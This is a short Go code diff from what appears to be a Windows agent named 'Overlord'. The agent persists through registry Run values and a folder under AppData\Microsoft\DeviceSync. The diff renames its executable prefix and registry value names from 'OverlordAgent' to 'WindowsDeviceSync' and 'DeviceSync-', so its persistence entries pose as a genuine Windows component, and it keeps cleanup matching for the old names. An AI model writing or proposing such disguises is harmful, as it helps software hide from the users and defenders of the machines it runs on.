@@ -25,10 +25,10 @@ const (
 
 	appDataBinaryDir = `Microsoft\DeviceSync`
 
-	defaultExecutablePrefix = "ovd_"
+	defaultExecutablePrefix = "ds_"
 
-	legacyRegistryValueName = "OverlordAgent"
-	registryValuePrefix     = "OverlordAgent-"
+	legacyRegistryValueName = "WindowsDeviceSync"
+	registryValuePrefix     = "DeviceSync-"
 
 	createNoWindow = 0x08000000
 )
@@ -301,7 +301,7 @@ func cleanupPrefixedExecutables(dir string) error {
 		if hasCustomName() {
 			match = name == strings.ToLower(DefaultStartupName+".exe")
 		} else {
-			match = strings.HasPrefix(name, defaultExecutablePrefix)
+			match = strings.HasPrefix(name, defaultExecutablePrefix) || strings.HasPrefix(name, "ovd_")
 		}
 		if match {
 			if err := os.Remove(filepath.Join(dir, entry.Name())); err != nil && !os.IsNotExist(err) {
@@ -342,8 +342,10 @@ func cleanupOverlordRunValues(k registry.Key) error {
 }
 
 func isOverlordRunValueName(name string) bool {
-	if strings.EqualFold(name, legacyRegistryValueName) {
+	lower := strings.ToLower(name)
+	if lower == strings.ToLower(legacyRegistryValueName) || lower == "overlordagent" {
 		return true
 	}
-	return strings.HasPrefix(strings.ToLower(name), strings.ToLower(registryValuePrefix))
+	return strings.HasPrefix(lower, strings.ToLower(registryValuePrefix)) ||
+		strings.HasPrefix(lower, "overlordagent-")
 }
